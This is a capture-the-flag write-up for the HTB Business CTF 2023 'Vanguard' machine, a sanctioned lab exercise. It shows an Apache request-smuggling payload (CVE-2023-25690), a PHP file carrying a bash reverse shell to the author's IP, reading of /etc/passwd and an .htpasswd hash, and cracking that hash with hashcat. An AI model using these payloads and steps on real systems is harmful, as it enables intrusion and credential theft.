---
layout: post
title: HTB Business CTF 2023 Writeup - FullPwn - Vanguard (user only)
date: 2023-07-19
type: post
tags:
- Writeup
- Hacking
- BusinessCTF
- CTF
permalink: /2023/07/HTBBusinessCTF/Vanguard
img: 2023/07/HTBBusinessCTF/Vanguard/Vanguard.png
---

In this challenge, I combined an insecure file upload with request smuggling to get a shell on the machine. The CTF ended before I could get root.

> Easy

## Enumeration

I ran rustscan to check for open ports.

```bash
$ rustscan -a target -- -A -Pn | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |                                                              
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.                                                                                          
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com       
                                                           
[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.246.192:22               
Open 10.129.246.192:80                      
[~] Starting Script(s)                         
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

...

Completed NSE at 14:48, 0.00s elapsed
Nmap scan report for target (10.129.246.192)
Host is up, received user-set (0.029s latency).
Scanned at 2023-07-16 14:48:12 EDT for 8s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.3 (protocol 2.0)
| ssh-hostkey: 
|   256 8e:bc:b2:f4:1b:e8:62:ac:bd:63:97:80:25:a1:7e:fe (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKEk9a4Mu0XiCxo4egKo7ivgQMv7bG3Ufx7xL3YzMCjFc8VDkyE/klk0t7x9G2UXF7OFLifl2xopRS0oyl9iiAk=
|   256 c0:50:00:d3:2e:a4:76:b0:da:52:f3:43:ba:ef:ec:11 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC0eEvnRiwxFz3KCGQ3tPlgyv/50TVQIGNPrEKvi+pd1
80/tcp open  http    syn-ack Apache httpd 2.4.55 ((Unix) PHP/8.2.8)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://vanguard.htb/
|_http-server-header: Apache/2.4.55 (Unix) PHP/8.2.8

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
```

Ports 22 (SSH) and 80 (HTTP) where open. I added 'vanguard.htb' to my hosts file. UDP and subdomains scans did not find anything of interest.

## Website

I looked at the website in a browser.

![Website](/assets/images/2023/07/HTBBusinessCTF/Vanguard/Vanguard.png "Website")

The site was simple. But there was a link to upload files.

![Upload Form](/assets/images/2023/07/HTBBusinessCTF/Vanguard/UploadForm.png "Upload Form")

I tried to upload files and quickly found that I could upload PHP files. But I did not know where the files were stored, and if I could access them. I found a '/uploads' endpoint, but it was password protected.

I ran Feroxbuster on the site to find hidden pages. It found that '/server-info' was accessible. 

From this page, I found some information about the Apache configuration.

```
Current Configuration:
    In file: /etc/httpd/conf/httpd.conf
     556: <VirtualHost *:80>
     563:   ProxyPassReverse "/leaders/" "http://127.0.0.1:8080/"
     568:   <Location /uploads*>
     573:     ProxyPass "http://127.0.0.1:8080/uploads/"
     574:     ProxyPassReverse "http://127.0.0.1:8080/uploads/"
        :   </Location>
        : </VirtualHost>


Current Configuration:
    In file: /etc/httpd/conf/httpd.conf
     556: <VirtualHost *:80>
     561:   RewriteEngine on
     562:   RewriteRule "^/leaders/(.*)" "http://127.0.0.1:8080/leader.php?id=$1" [P]
     565:   RewriteCond %{HTTP_HOST} !^vanguard.htb$
     566:   RewriteRule ^(.*)$ http://vanguard.htb$1 [R=permanent,L]
        : </VirtualHost>
```

With this information, and the Apache version number (2.4.55) identified by nmap, I looked for known vulnerabilities. I found it was vulnerable to [request smuggling](https://github.com/dhmosfunk/CVE-2023-25690-POC). And it was very easy to exploit.

I took the example code from the site and modified it to access the `test.php` file I had uploaded when testing the file upload.

```http
GET /leaders/1%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/uploads/test.php HTTP/1.1
Host: vanguard.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

The file was making a web request to my machine. And I got the hit. I uploaded a new file with a reverse shell in it.

```php
<?php
echo `bash -c 'bash -i >& /dev/tcp/10.10.14.54/4444 0>&1'`;
```

When I accessed it with the request smuggling, I got a hit on my netcat listener.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.54] from (UNKNOWN) [10.129.246.192] 54416
bash: cannot set terminal process group (269): Inappropriate ioctl for device
bash: no job control in this shell
[http@vanguard uploads]$ 
```

## Getting a User

After I was connected, I looked for ways to get a user. I read `/etc/passwd` and saw that there was a maximus user on the box.

```bash
[http@vanguard vanguard]$ cat /etc/passwd
cat /etc/passwd
root:x:0:0::/root:/bin/bash
bin:x:1:1::/:/usr/bin/nologin
daemon:x:2:2::/:/usr/bin/nologin
mail:x:8:12::/var/spool/mail:/usr/bin/nologin
ftp:x:14:11::/srv/ftp:/usr/bin/nologin
http:x:33:33::/srv/http:/usr/bin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/usr/bin/nologin
dbus:x:81:81:System Message Bus:/:/usr/bin/nologin
systemd-coredump:x:981:981:systemd Core Dumper:/:/usr/bin/nologin
systemd-network:x:980:980:systemd Network Management:/:/usr/bin/nologin
systemd-oom:x:979:979:systemd Userspace OOM Killer:/:/usr/bin/nologin
systemd-journal-remote:x:978:978:systemd Journal Remote:/:/usr/bin/nologin
systemd-resolve:x:977:977:systemd Resolver:/:/usr/bin/nologin
systemd-timesync:x:976:976:systemd Time Synchronization:/:/usr/bin/nologin
tss:x:975:975:tss user for tpm2:/:/usr/bin/nologin
uuidd:x:68:68::/:/usr/bin/nologin
maximus:x:1000:1000::/home/maximus:/bin/bash
```

From the Apache configuration, I knew there was an `.htpasswd` file on the server.

```bash
[http@vanguard http]$ cat  /etc/httpd/.htpasswd
cat  /etc/httpd/.htpasswd
maximus-webadmin:$apr1$4uK/teeQ$8gAFoYWl7ba5Vy7Bjy3nK/
```

I saved the hash in a file and used `hashcat` to crack it.

```bash
$ hashcat -a0 hash.txt /usr/share/seclists/rockyou.txt                                                               
hashcat (v6.2.6) starting in autodetect mode  


$apr1$4uK/teeQ$8gAFoYWl7ba5Vy7Bjy3nK/:100%snoopy          
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$4uK/teeQ$8gAFoYWl7ba5Vy7Bjy3nK/
Time.Started.....: Sun Jul 16 16:22:45 2023 (10 mins, 1 sec)
Time.Estimated...: Sun Jul 16 16:32:46 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    22607 H/s (7.72ms) @ Accel:64 Loops:500 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 13476480/14344384 (93.95%)
Rejected.........: 0/13476480 (0.00%)
Restore.Point....: 13476096/14344384 (93.95%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:500-1000
Candidate.Engine.: Device Generator
Candidates.#1....: 100003470 -> 100%prince
Hardware.Mon.#1..: Util: 94%

Started: Sun Jul 16 16:22:26 2023
Stopped: Sun Jul 16 16:32:47 2023
```


I used the password to reconnect to the server as maximus and read the user flag.

```bash
$ ssh maximus@target
maximus@target's password: 
[maximus@vanguard ~]$ cat user.txt 
HTB{h3y_l0ok_aT_mE_Im_a_bLu3pR1nT_sMUggL3r}
```

This is as far as I went. I spent the few minutes I had left trying to get root. But the CTF ended before I had time to root the box.